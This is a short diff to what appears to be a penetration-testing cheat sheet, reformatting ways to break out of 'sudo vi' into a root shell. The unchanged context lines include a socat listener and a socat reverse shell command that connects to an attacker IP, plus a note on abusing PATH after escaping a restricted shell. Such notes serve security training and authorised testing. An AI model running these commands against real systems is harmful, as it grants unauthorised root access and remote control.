@@ -714,9 +714,9 @@ socat file:`tty`,raw,echo=0 tcp-listen:443                 Attack VM
 sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443
 
 sudo vi                                                    :!bash
-sudo vi                                                    !/bin/sh then hit enter
-sudo vi                                                    :set shell=/bin/bash:shell
-sudo vi                                                    :shell
+sudo vi                                                    !/bin/sh
+sudo vi                                                    :set shell=/bin/bash
+                                                           :shell
 
 - Abusing the PATH variable
 After escaping a restricted shell, export “/bin/bash” as a SHELL environment variable
